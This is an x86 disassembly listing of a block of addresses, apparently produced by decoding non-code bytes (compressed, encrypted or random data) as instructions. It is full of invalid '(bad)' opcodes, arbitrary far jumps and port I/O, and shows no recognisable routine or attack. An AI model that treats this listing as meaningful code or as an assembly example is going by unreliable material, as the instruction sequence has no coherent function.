  430117:	fst    QWORD PTR [ecx-0x11]
  43011a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43011b:	jmp    0x43013d
  43011d:	loop   0x4300f3
  43011f:	dec    edx
  430120:	and    ecx,ebp
  430122:	or     bl,BYTE PTR [eax+0x4c]
  430125:	and    eax,0xd5049a1c
  43012a:	retf   
  43012b:	sbb    dl,al
  43012d:	sbb    eax,0xb1a09555
  430132:	jo     0x430125
  430134:	sbb    ebx,DWORD PTR [ecx-0x74]
  430137:	push   ds
  430138:	dec    BYTE PTR gs:[ebp-0x7465903e]
  43013f:	jge    0x4300cc
  430141:	inc    esi
  430142:	xlat   BYTE PTR ds:[ebx]
  430143:	or     BYTE PTR fs:[ebx-0x6c3ae65e],al
  43014a:	mov    ebx,0xae197b24
  43014f:	loope  0x4300f6
  430151:	bound  ecx,QWORD PTR [edx]
  430153:	jmp    0x3b9848de
  430158:	push   ds
  430159:	cdq    
  43015a:	jae    0x4301be
  43015c:	ror    cl,cl
  43015e:	sbb    al,0x60
  430160:	ins    BYTE PTR es:[edi],dx
  430161:	push   es
  430162:	mov    edx,0x5df765b1
  430167:	jmp    0xc77f335b
  43016c:	bound  esi,QWORD PTR [edi+0x47]
  43016f:	xchg   edx,eax
  430170:	sub    al,0xab
  430172:	mov    bl,0x54
  430174:	xchg   esi,eax
  430175:	das    
  430176:	sbb    cl,dh
  430178:	aad    0x64
  43017a:	mov    eax,ds:0x97352ae8
  43017f:	dec    eax
  430180:	and    ebx,ecx
  430182:	out    0x20,al
  430184:	mov    ?,WORD PTR [esi+0x53d138eb]
  43018a:	lods   al,BYTE PTR ds:[esi]
  43018b:	mov    dh,0x81
  43018e:	shl    BYTE PTR [esi],1
  430190:	les    esi,FWORD PTR [esi+esi*4-0x14]
  430194:	mov    ebx,ecx
  430196:	dec    esp
  430197:	cmp    BYTE PTR [ebx+0x10bc38b7],dl
  43019d:	daa    
  43019e:	mov    al,0x9b
  4301a0:	dec    eax
  4301a1:	lods   al,BYTE PTR ds:[esi]
  4301a2:	lods   al,BYTE PTR ds:[esi]
  4301a3:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  4301a5:	addr16 dec ebp
  4301a7:	out    dx,eax
  4301a8:	mov    ah,0x62
  4301aa:	(bad)  
  4301ab:	sti    
  4301ac:	fldcw  WORD PTR [ebx]
  4301ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4301af:	out    0x83,al
  4301b1:	test   ebx,ebp
  4301b3:	mov    eax,0xe4c852d5
  4301b8:	sbb    ebp,DWORD PTR [esi]
  4301ba:	adc    al,0x92
  4301bc:	inc    eax
  4301bd:	mov    bh,0x2c
  4301bf:	mov    ch,0x5a
  4301c1:	scas   eax,DWORD PTR es:[edi]
  4301c2:	mov    ah,0x64
  4301c4:	mov    ebx,0x56f11d69
  4301c9:	outs   dx,BYTE PTR ds:[esi]
  4301ca:	dec    eax
  4301cb:	shl    BYTE PTR [edx],1
  4301cd:	mov    eax,ds:0xb2a959d3
  4301d2:	outs   dx,BYTE PTR ds:[esi]
  4301d3:	outs   dx,DWORD PTR ds:[esi]
  4301d4:	adc    DWORD PTR [eax-0x41],eax
  4301d7:	add    al,0xb6
  4301d9:	or     DWORD PTR [edi+eiz*2-0x2b],ebx
  4301dd:	add    al,0x1b
  4301df:	repnz icebp 
  4301e1:	adc    eax,0x20dd73a2
  4301e6:	mov    al,0x77
  4301e8:	cdq    
  4301e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4301ea:	mov    dl,0x54
  4301ec:	sub    al,0xdc
  4301ee:	imul   edi,DWORD PTR [ebx],0x4792e5d8
  4301f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4301f5:	pushf  
  4301f6:	cmp    eax,0x316432f3
  4301fb:	cwde   
  4301fc:	call   0x2ae1:0x614bcc5
  430203:	pop    ss
  430204:	js     0x4301fa
  430206:	push   ebp
  430207:	dec    ebp
  430208:	inc    esi
  430209:	cwde   
  43020a:	xchg   BYTE PTR [ebx],al
  43020c:	aas    
  43020d:	popf   
  43020e:	xchg   ecx,eax
  43020f:	ficom  WORD PTR [edi]
  430211:	test   eax,0x542414a3
  430216:	sbb    al,0x1a
  430218:	mov    ebx,DWORD PTR [ecx+0x3ffe0beb]
  43021e:	repz mov dl,0x1f
  430221:	(bad)  
  430222:	hlt    
  430223:	mov    WORD PTR [eax],?
  430225:	sar    DWORD PTR [ebx+0x56],cl
  430228:	sbb    BYTE PTR [edx-0xdd79265],0x92
  43022f:	not    DWORD PTR ds:0x9fe7faac
  430235:	inc    edi
  430236:	cli    
  430237:	std    
  430238:	adc    DWORD PTR [edx],ebp
  43023a:	inc    esi
  43023b:	mov    eax,0x76b7a6d3
  430240:	fidivr WORD PTR [edi+0x6c35980a]
  430246:	sbb    ebp,ebx
  430248:	daa    
  430249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43024a:	push   ebx
  43024b:	fdivrp st(5),st
  43024d:	or     ch,BYTE PTR [ebp+0x5db5239a]
  430253:	or     eax,0x70b49bb9
  430258:	lds    esi,FWORD PTR [ebx-0x6b]
  43025b:	in     eax,0xc8
  43025d:	scas   eax,DWORD PTR es:[edi]
  43025e:	cdq    
  43025f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430260:	or     eax,0x2674af6b
  430265:	mov    ebp,0xa9a92d91
  43026a:	(bad)  
  43026b:	xchg   ebx,eax
  43026c:	retf   0x7cd6
  43026f:	and    edi,edx
  430271:	retf   
  430272:	sub    esp,DWORD PTR [ebx-0x17ae5df4]
  430278:	mov    bl,0x7c
  43027a:	cmp    ebp,DWORD PTR [esi]
  43027c:	jno    0x4302c4
  43027e:	add    DWORD PTR [esi+0x1a779d20],0x421b8f3c
  430288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430289:	or     DWORD PTR [edi-0x13],eax
  43028c:	mov    gs:0x191628e6,al
  430292:	call   0xf2cb:0x80d1e712
  430299:	adc    edi,DWORD PTR [edi+ebp*8]
  43029c:	xchg   bp,ax
  43029e:	add    ebx,DWORD PTR [edi-0xfc64dd7]
  4302a4:	pop    ss
  4302a5:	stc    
  4302a6:	mov    edx,0xb742df8b
  4302ab:	pop    edi
  4302ac:	and    eax,DWORD PTR [ebx+0x6c3d514c]
  4302b2:	sahf   
  4302b3:	mov    ds:0x9aba07e7,eax
  4302b8:	add    edi,edx
  4302ba:	jne    0x4302a9
  4302bc:	neg    BYTE PTR [edi+0x7bf87d95]
  4302c2:	inc    ecx
  4302c3:	mov    ds:0xe6911a45,al
  4302c8:	les    edx,FWORD PTR [edi-0x24fb4589]
  4302ce:	lahf   
  4302cf:	push   0x8e47595
  4302d4:	push   ds
  4302d5:	mov    ch,0x23
  4302d7:	sbb    bl,al
  4302d9:	daa    
  4302da:	fcmovnbe st,st(6)
  4302dc:	adc    eax,0x3429bf79
  4302e1:	leave  
  4302e2:	iret   
  4302e3:	outs   dx,DWORD PTR ds:[esi]
  4302e4:	inc    eax
  4302e5:	inc    edi
  4302e6:	sahf   
  4302e7:	cmp    DWORD PTR [esi+0x6c],edi
  4302ea:	push   edx
  4302eb:	ror    BYTE PTR [ecx],1
  4302ed:	or     eax,0x5dacea15
  4302f2:	popf   
  4302f3:	mov    al,0x4
  4302f5:	mov    ds:0x5d51853b,al
  4302fa:	jmp    0x85cc1aa5
  4302ff:	es fst st(0)
  430302:	retf   0x2d37
  430305:	and    al,0xf0
  430307:	pop    ecx
  430308:	(bad)
  43030c:	imul   BYTE PTR [eax-0x2117b8da]
  430312:	shl    DWORD PTR [eax-0x2b17e125],0x9
  430319:	sbb    eax,0xa353f815
  43031e:	fwait
  43031f:	and    eax,0x6d742840
  430324:	stos   BYTE PTR es:[edi],al
  430325:	and    eax,0xfcbf248a
  43032a:	mov    bl,0xc4
  43032c:	xlat   BYTE PTR ds:[ebx]
  43032d:	mov    ecx,0xa4e5413d
  430332:	jmp    0x430340
  430334:	push   ecx
  430335:	out    0x95,eax
  430337:	aaa    
  430338:	cmp    al,0x16
  43033a:	or     eax,0xbbeed49f
  43033f:	xchg   esp,eax
  430340:	fisttp QWORD PTR [ebx-0x3cfa380c]
  430346:	(bad)  
  430348:	int    0x40
  43034a:	fistp  QWORD PTR [ebx-0x1acafbe3]
  430350:	repnz dec esp
  430352:	je     0x4302ec
  430354:	sbb    BYTE PTR [eax-0x2c14badd],ch
  43035a:	loop   0x430318
  43035c:	jne    0x4303bf
  43035e:	push   eax
  43035f:	in     al,dx
  430360:	mov    bl,0x9d
  430362:	mov    bl,0xc2
  430364:	ret    0x7687
  430367:	loop   0x43035e
  430369:	dec    ebp
  43036a:	mov    cl,0xb4
  43036c:	dec    ebx
  43036d:	and    dl,BYTE PTR [edx-0x79]
  430370:	int    0x92
  430372:	dec    esp
  430373:	aas    
  430374:	push   esi
  430375:	adc    edi,DWORD PTR [edi+edx*4-0x37]
  430379:	mov    eax,0x9ca38ae9
  43037e:	inc    edx
  43037f:	and    DWORD PTR [ebx],0x49
  430382:	stc    
  430383:	pop    es
  430384:	hlt    
  430385:	(bad)  
  430386:	sub    bx,WORD PTR [edi]
  430389:	fwait
  43038a:	fwait
  43038b:	(bad)
  43038f:	inc    edi
  430390:	(bad)  
  430391:	outs   dx,DWORD PTR ds:[esi]
  430392:	stc    
  430393:	inc    ecx
  430394:	add    DWORD PTR [ebp+0x39a67c37],ebx
  43039a:	ja     0x430375
  43039c:	leave  
  43039d:	cmp    cl,BYTE PTR [ebx-0x15]
  4303a0:	add    BYTE PTR [edx],cl
  4303a2:	or     al,0x13
  4303a4:	jp     0x430412
  4303a6:	rol    BYTE PTR [edx-0x15b2e140],1
  4303ac:	push   ss
  4303ad:	leave  
  4303ae:	std    
  4303af:	mov    cl,0xfa
  4303b1:	es out 0xaa,eax
  4303b4:	fwait
  4303b5:	push   ecx
  4303b6:	rcr    DWORD PTR [edi-0x4de59677],cl
  4303bc:	fs jge 0x430373
  4303bf:	pop    esp
  4303c0:	cmp    cl,BYTE PTR [eax]
  4303c2:	out    0xc3,eax
  4303c4:	test   DWORD PTR [edx-0x4a],ecx
  4303c7:	xor    al,0x64
  4303c9:	dec    edx
  4303ca:	jle    0x4303c0
  4303cc:	mov    ah,0x9f
  4303ce:	jmp    0x4303b6
  4303d0:	adc    al,0xf9
  4303d2:	ret    
  4303d3:	dec    ecx
  4303d4:	xchg   ebx,eax
  4303d5:	clc    
  4303d6:	mov    cl,0x1a
  4303d8:	lods   al,BYTE PTR ds:[esi]
  4303d9:	lea    edi,[edi+0x37b55e44]
  4303df:	shl    DWORD PTR [esi-0x7da08179],0x9d
  4303e6:	je     0x43037d
  4303e8:	mov    bl,0x91
  4303ea:	sub    ch,al
  4303ec:	pop    ds
  4303ed:	pushf  
  4303ee:	mov    ebp,0x8eb8af54
  4303f3:	rcl    DWORD PTR [esi-0x68],1
  4303f6:	mov    ds:0x54717b21,eax
  4303fb:	pop    ecx
  4303fc:	dec    esp
  4303fd:	add    al,0x33
  4303ff:	or     BYTE PTR [edi-0x50],0xba
  430403:	mov    ah,0x80
  430405:	hlt    
  430406:	dec    esi
  430407:	jecxz  0x43043e
  430409:	and    al,0x73
  43040b:	hlt    
  43040c:	gs push ss
  43040e:	outs   dx,BYTE PTR ds:[esi]
  43040f:	dec    esi
  430410:	(bad)
  430414:	sbb    BYTE PTR [edi+0xd],al
  430417:	sub    edx,DWORD PTR ds:0x9fecc9c6
  43041e:	cmp    edx,DWORD PTR [ebx+0x2389d488]
  430424:	call   0xbd7f:0xf3183da
  43042b:	je     0x430478
  43042d:	loop   0x430421
  43042f:	jb     0x4303f7
  430431:	cli    
  430432:	xchg   BYTE PTR [edx],bl
  430434:	mov    esi,edi
  430436:	das    
  430437:	adc    eax,0x7cca65a0
  43043c:	cmp    edi,DWORD PTR [edx]
  43043e:	dec    edx
  43043f:	mov    al,0x1
  430441:	sub    al,BYTE PTR [edx+0x1205a7c9]
  430447:	repnz dec esp
  430449:	call   0xfd29:0x79c53d62
  430450:	cli    
  430451:	pop    edx
  430452:	mov    DWORD PTR [edx+0x31],ecx
  430455:	les    esi,FWORD PTR [edi]
  430457:	cmc    
  430458:	cdq    
  430459:	cs mov ecx,0xbf3924fa
  43045f:	repnz mov dh,0x43
  430462:	fwait
  430463:	jns    0x4303f4
  430465:	and    bh,bl
  430467:	add    ecx,DWORD PTR [edi]
  430469:	cmp    ebx,DWORD PTR [esi+0x73044c25]
  43046f:	outs   dx,BYTE PTR ds:[esi]
  430470:	ja     0x4304bc
  430472:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430473:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430474:	add    eax,0x78e68e23
  430479:	mov    ds:0x69fca3dd,al
  43047e:	mov    esi,0x6de0d2b4
  430483:	and    esp,ebp
  430485:	xchg   edi,eax
  430486:	xor    eax,esi
  430488:	or     dh,BYTE PTR [esi+edx*4]
  43048b:	jmp    0xce52:0xb0426917
  430492:	ss (bad) 
  430494:	inc    edi
  430495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430496:	(bad)  ds:0x2832d381
  43049c:	js     0x43041f
  43049e:	scas   al,BYTE PTR es:[edi]
  43049f:	nop
  4304a0:	ficomp DWORD PTR [esi+0x1f8db893]
  4304a6:	rcl    esp,cl
  4304a8:	mov    esp,0x60912ba8
  4304ad:	xchg   esi,eax
  4304ae:	cmp    bh,bl
  4304b0:	pop    edx
  4304b1:	mov    es,WORD PTR ds:0xba6420fc
  4304b7:	xor    al,0xca
  4304b9:	jp     0x4304ce
  4304bb:	(bad)  
  4304bc:	cmc    
  4304bd:	sub    BYTE PTR [edi-0xc],ah
  4304c0:	mov    dh,0xef
  4304c2:	sbb    BYTE PTR [ebx+0x1d],cl
  4304c5:	fstp   DWORD PTR [edx-0x25642e52]
  4304cb:	test   al,0x3b
  4304cd:	fwait
  4304ce:	imul   esi,DWORD PTR [ebx+0x2e],0x4
  4304d2:	outs   dx,DWORD PTR ds:[esi]
  4304d3:	jnp    0x430512
  4304d5:	xor    cl,BYTE PTR [ecx+0x2f7d5d50]
  4304db:	lds    edx,FWORD PTR [esi]
  4304dd:	push   0xffffffe3
  4304df:	sub    BYTE PTR [esi],ch
  4304e1:	mov    BYTE PTR [edi+ecx*8],cl
  4304e4:	mov    WORD PTR [edx],?
  4304e6:	xchg   DWORD PTR [ecx],esi
  4304e8:	(bad)  
  4304ea:	mov    al,0xde
  4304ec:	and    bl,BYTE PTR [ecx+0x23b57b72]
  4304f2:	pushf  
  4304f3:	pop    edi
  4304f4:	jecxz  0x430494
  4304f6:	jmp    0x430492
  4304f8:	std    
  4304f9:	les    ebp,FWORD PTR [eax]
  4304fb:	dec    esp
  4304fc:	add    bl,BYTE PTR [edx-0x447cebec]
  430502:	mov    dl,0x54
  430504:	dec    esi
  430505:	xlat   BYTE PTR ds:[ebx]
  430506:	sahf   
  430507:	pop    ebp
  430508:	mov    dh,0xac
  43050a:	jo     0x4304ec
  43050c:	and    bh,bl
  43050e:	jnp    0x4304e1
  430510:	mov    edi,0xa8db5408
  430515:	sub    eax,0xf223b4be
  43051a:	push   cs
  43051b:	jnp    0x430524
  43051d:	retf   0xa5dc
  430520:	push   esi
  430521:	mov    DWORD PTR [ebp+0x63],ecx
  430524:	jbe    0x4304c8
  430526:	les    ebx,FWORD PTR [esi+0x48]
  430529:	aad    0xfd
  43052b:	mov    ds:0xb4b2a04e,eax
  430530:	or     eax,0x62ef4d2
  430535:	(bad)  
  430536:	retf   
  430537:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430538:	cmp    al,BYTE PTR [edx]
  43053a:	imul   esp,DWORD PTR [eax],0xffffffc4
  43053d:	mov    al,0x5
  43053f:	cmp    al,0x23
  430541:	test   eax,0x9db79412
  430546:	add    BYTE PTR [esi],0x9b
  430549:	pushf  
  43054a:	(bad)  [eax]
  43054c:	sub    eax,0x3ddcf20c
  430551:	(bad)  
  430552:	or     BYTE PTR [eax-0x5d],0x26
  430556:	mov    al,0xc4
  430558:	retf   
  430559:	jg     0x430509
  43055b:	mov    ah,0x8a
  43055d:	and    DWORD PTR [edi],ecx
  43055f:	scas   eax,DWORD PTR es:[edi]
  430560:	out    0x3c,eax
  430562:	pop    edx
  430563:	call   0x64fd05c6
  430568:	inc    DWORD PTR [edx+0x7a39ef39]
  43056e:	fld    QWORD PTR [ecx+esi*8]
  430571:	ret    0xa631
  430574:	into   
  430575:	call   0xa1fe:0x2860d5fb
  43057c:	in     eax,0xeb
  43057e:	cmp    eax,ebp
  430580:	iret   
  430581:	test   al,0xd8
  430583:	sbb    al,0x18
  430585:	sub    edi,edi
  430587:	pop    ss
  430588:	cwde   
  430589:	sbb    ecx,DWORD PTR ss:[esi-0x4a1ed9d5]
  430590:	mov    cl,0xa0
  430592:	or     ebp,DWORD PTR [ecx-0x6278988d]
  430598:	mov    al,0x7c
  43059a:	js     0x430567
  43059c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43059d:	jbe    0x430555
  43059f:	les    ecx,FWORD PTR [ecx+0x44313fe8]
  4305a5:	mov    ds:0xe5cf315b,al
  4305aa:	clc    
  4305ab:	sbb    dh,BYTE PTR [edx]
  4305ad:	cvtpi2ps xmm6,QWORD PTR [esi]
  4305b0:	and    al,0xde
  4305b2:	jb     0x43061d
  4305b4:	stos   DWORD PTR es:[edi],eax
  4305b5:	push   edi
  4305b6:	mov    dh,0x64
  4305b8:	mov    eax,0x26d78be1
  4305bd:	mov    ds:0xda0e5ad0,eax
  4305c2:	shl    ah,1
  4305c4:	or     esi,0xb91eefed
  4305ca:	jg     0x43060d
  4305cc:	shl    bl,0x8e
  4305cf:	sub    dh,BYTE PTR [edi-0x5f]
  4305d2:	jmp    0x4305b9
  4305d4:	or     DWORD PTR [esi+0x40b315c8],eax
  4305da:	out    0xec,eax
  4305dc:	pop    ss
  4305dd:	jno    0x43064b
  4305df:	repz and al,0xe8
  4305e2:	mov    ecx,0x57050b14
  4305e7:	test   al,0x85
  4305e9:	fisubr WORD PTR [edi+0xfc869e7]
  4305ef:	ror    DWORD PTR [edi],cl
  4305f1:	stos   DWORD PTR es:[edi],eax
  4305f2:	fst    st(7)
  4305f4:	xchg   esp,eax
  4305f5:	cmp    eax,0xe51b19bd
  4305fa:	mov    esi,DWORD PTR [eax]
  4305fc:	dec    ecx
  4305fd:	(bad)  
  4305fe:	leave  
  4305ff:	jnp    0x4305c6
  430601:	xchg   esp,eax
  430602:	retf   
  430603:	repz mov ah,0x41
  430606:	leave  
  430607:	mov    eax,0x4556591a
  43060c:	fsubr  QWORD PTR [ebx+eax*4+0x2ba55f1d]
  430613:	jb     0x430613
  430615:	cld    
  430616:	adc    dh,BYTE PTR [edx-0x6a4b7c36]
  43061c:	lds    ecx,FWORD PTR [ebp+0x232d84e8]
  430622:	cmp    ebx,ebp
  430624:	cs out 0x3a,al
  430627:	and    BYTE PTR [ecx-0xd94f915],bl
  43062d:	mov    ds:0x28a160a3,al
  430632:	dec    esp
  430633:	out    dx,al
  430634:	test   eax,0xa83363b8
  430639:	into   
  43063a:	jnp    0x4305c6
  43063c:	and    al,dl
  43063e:	push   esi
  43063f:	int3   
  430640:	dec    edi
  430641:	or     esp,esi
  430643:	outs   dx,DWORD PTR ds:[esi]
  430644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430645:	shr    DWORD PTR [ecx-0x30],1
  430648:	sbb    al,0xb
  43064a:	mov    dl,0x3c
  43064c:	inc    ebx
  43064d:	mov    bh,0x7c
  43064f:	mov    esp,0x1542c5ab
  430654:	lods   eax,DWORD PTR ds:[esi]
  430655:	sub    al,0x8e
  430657:	out    0x29,eax
  430659:	stos   DWORD PTR es:[edi],eax
  43065a:	loop   0x430691
  43065c:	jbe    0x4306cd
  43065e:	in     al,dx
  43065f:	stos   DWORD PTR es:[edi],eax
  430660:	fbstp  TBYTE PTR [edx-0x5cb04131]
  430666:	xchg   ebx,eax
  430667:	mov    BYTE PTR [edi+0x2b66433e],bl
  43066d:	test   al,0xeb
  43066f:	aaa    
  430670:	mov    bl,0x5d
  430672:	push   0x7d8c3089
  430677:	cmp    dh,cl
  430679:	retf   
  43067a:	mov    ebp,0xf20ad2f4
  43067f:	mov    edi,0xd8b76e69
  430684:	fs xchg ebx,eax
  430686:	and    ch,ch
  430688:	xor    al,0xe0
  43068a:	and    ch,0x1f
  43068d:	fnstcw WORD PTR [edi]
  43068f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430690:	les    ebx,FWORD PTR [ecx]
  430692:	jmp    FWORD PTR [esp+edi*2+0xb]
  430696:	fsub   QWORD PTR [ebx+esi*2]
  430699:	jecxz  0x430667
  43069b:	add    ebp,edi
  43069d:	in     eax,dx
  43069e:	pusha  
  43069f:	icebp  
  4306a0:	push   ss
  4306a1:	cmp    edi,edx
  4306a3:	sub    DWORD PTR [eax+0x7085d1b7],edi
  4306a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4306aa:	jmp    0x430632
  4306ac:	dec    ecx
  4306ad:	stos   BYTE PTR es:[edi],al
  4306ae:	mov    WORD PTR [ecx],fs
  4306b0:	test   ecx,edi
  4306b2:	jo     0x430695
  4306b4:	push   ss
  4306b5:	and    al,0xb8
  4306b7:	add    al,0xd6
  4306b9:	push   edi
  4306ba:	push   edx
  4306bb:	mov    ecx,0xe5550605
  4306c0:	retf   
  4306c1:	rcl    BYTE PTR [edx+0x4aaae3e4],1
  4306c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4306c8:	sbb    edi,DWORD PTR [ebp+0x3cf623d5]
  4306ce:	add    ch,BYTE PTR [ebp+edi*4-0x64]
  4306d2:	jnp    0x43065e
  4306d4:	xchg   ebx,eax
  4306d5:	shl    DWORD PTR [esi+eax*4],1
  4306d8:	lock std 
  4306da:	bound  ebp,QWORD PTR [ecx+eiz*2-0x5e278c64]
  4306e1:	mov    ebp,0x24a9ad11
  4306e6:	ds xchg ebx,eax
  4306e8:	add    eax,0x94969ba3
  4306ed:	ret    0xa67b
  4306f0:	mov    ebp,0x44fe7243
  4306f5:	mov    cl,0x2a
  4306f7:	mov    ch,0x18
  4306f9:	and    DWORD PTR [edi],ebp
  4306fb:	pop    eax
  4306fc:	into   
  4306fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4306fe:	fld    TBYTE PTR [edx-0x1dfe713e]
  430704:	or     eax,DWORD PTR [ebp-0x74da9ee8]
  43070a:	jmp    0x94dd2953
  43070f:	je     0x430757
  430711:	mov    esp,ds
  430713:	pop    es
  430714:	std    
  430715:	add    DWORD PTR [esi-0x9],eax
  430718:	and    BYTE PTR [edi+0x5f67772d],0xc
  43071f:	sub    al,0xfa
  430721:	sub    dh,BYTE PTR [ecx+0x19ed284]
  430727:	test   al,0x25
  430729:	jae    0x430768
  43072b:	lock (bad) 
  43072d:	pop    ss
  43072e:	sbb    BYTE PTR [ecx],dl
  430730:	and    DWORD PTR [ecx-0x1b7b792d],ecx
  430736:	ins    BYTE PTR es:[edi],dx
  430737:	(bad)  
  430738:	sbb    DWORD PTR [ebp-0x432a29a5],ebx
  43073e:	xchg   esi,eax
  43073f:	pusha  
  430740:	xor    eax,0xad1ce004
  430745:	cld    
  430746:	and    ah,BYTE PTR [ebp-0x77]
  430749:	push   ecx
  43074a:	mov    ds:0x4abc8eb3,al
  43074f:	sbb    ah,BYTE PTR ds:0x4ae449e3
  430755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430756:	mov    ebp,DWORD PTR [ebx]
  430758:	aaa    
  430759:	mov    bh,0x74
  43075b:	in     al,0x17
  43075d:	sti    
  43075e:	leave  
  43075f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430760:	ins    DWORD PTR es:[edi],dx
  430761:	xchg   DWORD PTR [eax+0xc17b5f4],edi
  430767:	cmp    al,0x95
  430769:	jl     0x4307e6
  43076b:	call   0x47c884eb
  430770:	out    dx,al
  430771:	retf   0x1bbd
  430774:	and    al,0x7d
  430776:	mov    eax,0x86934dea
  43077b:	(bad)  [ebx+0x4de6fba7]
  430781:	push   es
  430782:	les    ebp,FWORD PTR [ebx+0x49]
  430785:	fs pop ebp
  430787:	pusha  
  430788:	scas   eax,DWORD PTR es:[edi]
  430789:	pop    esp
  43078a:	mov    ch,0x94
  43078c:	sbb    BYTE PTR [eax-0x770ac39a],bl
  430792:	pop    edx
  430793:	jmp    0x8f17:0x945ce4e
  43079a:	out    dx,al
  43079b:	inc    esi
  43079c:	addr16 (bad) 
  43079e:	rcl    DWORD PTR [edx],cl
  4307a0:	(bad)  
  4307a1:	push   cs
  4307a2:	stos   DWORD PTR es:[edi],eax
  4307a3:	and    DWORD PTR [edx-0x1bd745b3],edi
  4307a9:	ja     0x430769
  4307ab:	inc    eax
  4307ac:	repz lahf 
  4307ae:	mov    esp,0x6648f554
  4307b3:	test   al,0xc5
  4307b5:	pop    esi
  4307b6:	ins    DWORD PTR es:[edi],dx
  4307b7:	in     al,dx
  4307b8:	fbld   TBYTE PTR [eax+0x22]
  4307bb:	inc    ebx
  4307bc:	and    BYTE PTR [ecx-0x5c],bh
  4307bf:	(bad)  
  4307c0:	cwde   
  4307c1:	rcl    BYTE PTR [edx+ebp*1],cl
  4307c4:	int    0x9f
  4307c6:	sti    
  4307c7:	leave  
  4307c8:	sub    al,0x21
  4307ca:	into   
  4307cb:	repz jle 0x43078f
  4307ce:	sub    DWORD PTR [ebx+eiz*1-0x17],0xf6942b4
  4307d6:	fdiv   st,st(1)
  4307d8:	mov    al,0x8f
  4307da:	cmp    eax,0x3a7befa
  4307df:	add    DWORD PTR [edx],ecx
  4307e1:	adc    al,BYTE PTR [ecx-0x75b228ca]
  4307e7:	addr16 out 0x19,eax
  4307ea:	cmp    DWORD PTR [esp+ebx*1+0x16c8cce2],0xffffffdd
  4307f2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4307f4:	jmp    0xe970:0xa91a3c7a
  4307fb:	test   DWORD PTR [eax+0x225eba5f],esi
  430801:	cmp    DWORD PTR [esi+0x72c7a939],edi
  430807:	pushf  
  430808:	jle    0x4307a7
  43080a:	stos   DWORD PTR es:[edi],eax
  43080b:	mov    ebp,0x39342134
  430810:	lods   al,BYTE PTR ds:[esi]
  430811:	sub    ch,BYTE PTR [esi+eax*4-0x4b422884]
  430818:	out    0x63,al
  43081a:	stc    
  43081b:	leave  
  43081c:	int    0xa6
  43081e:	fwait
  43081f:	int3   
  430820:	xchg   BYTE PTR [eax],cl
  430822:	xor    BYTE PTR [ebx-0x12],bl
  430825:	out    dx,eax
  430826:	aad    0x9d
  430828:	lahf   
  430829:	(bad)  
  43082a:	mov    esi,0xf9d07364
  43082f:	rcl    ch,cl
  430831:	in     al,0x5d
  430833:	call   0x6add76b8
  430838:	sbb    eax,0x5992a1c9
  43083d:	int    0x94
  43083f:	pop    ebp
  430840:	jnp    0x4308a9
  430842:	jp     0x430886
  430844:	add    eax,0x9303b9d
  430849:	sbb    ebp,ecx
  43084b:	nop
  43084c:	push   esi
  43084d:	xor    DWORD PTR [eax-0x463b2134],esp
  430853:	push   esp
  430854:	pop    ss
  430855:	ret    
  430856:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430857:	ret    
  430858:	xor    eax,0x1fea90a9
  43085d:	xchg   edi,eax
  43085e:	push   eax
  43085f:	(bad)  
  430860:	push   ds
  430861:	mov    ecx,0x5dc89054
  430866:	mov    edx,0xbba58c5a
  43086b:	out    0xda,ax
  43086e:	sti    
  43086f:	enter  0x3e4,0xad
  430873:	imul   edi,DWORD PTR [edx+0x25552d50],0x5e
  43087a:	jns    0x430832
  43087c:	add    DWORD PTR [ebx],0xc
  43087f:	in     al,0x37
  430881:	cwde   
  430882:	adc    BYTE PTR [edi],ah
  430884:	pushf  
  430885:	mov    DWORD PTR [eax],0xba5f3a6b
  43088b:	hlt    
  43088c:	push   ecx
  43088d:	loop   0x4308a3
  43088f:	jge    0x4308d6
  430891:	gs push ecx
  430894:	add    edx,DWORD PTR [ebx]
  430896:	push   ebx
  430897:	pop    esi
  430898:	in     eax,0xa
  43089a:	sti    
  43089b:	pop    ss
  43089c:	sub    edx,ecx
  43089e:	leave  
  43089f:	ss sahf 
  4308a1:	enter  0x3112,0x38
  4308a5:	and    dh,BYTE PTR [ebx-0x6cb55ac5]
  4308ab:	jmp    0xda2af156
  4308b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b1:	enter  0x7026,0xb0
  4308b5:	mov    DWORD PTR [ebp-0x39513b5c],edi
  4308bb:	sub    eax,0x18f0d466
  4308c0:	jecxz  0x4308fe
  4308c2:	push   esi
  4308c3:	mov    eax,edi
  4308c5:	mov    eax,ds:0xa93e3f36
  4308ca:	mov    ch,0x14
  4308cc:	ficom  DWORD PTR [ecx]
  4308ce:	jmp    0x8748cf8a
  4308d3:	iret   
  4308d4:	and    ebp,eax
  4308d6:	and    eax,0x62988de6
  4308db:	stc    
  4308dc:	js     0x4308b8
  4308de:	jmp    0x430924
  4308e0:	dec    ecx
  4308e1:	and    DWORD PTR [edi-0x4c],esi
  4308e4:	cmp    bl,BYTE PTR [edx+0x6506a1b]
  4308ea:	xchg   edx,eax
  4308eb:	cli    
  4308ec:	in     eax,0x4e
  4308ee:	fsub   QWORD PTR [edi+0x14]
  4308f1:	test   al,0x3a
  4308f3:	sub    BYTE PTR [eax-0xd1b4f6f],cl
  4308f9:	das    
  4308fa:	out    0x1f,eax
  4308fc:	xchg   esi,eax
  4308fd:	pop    es
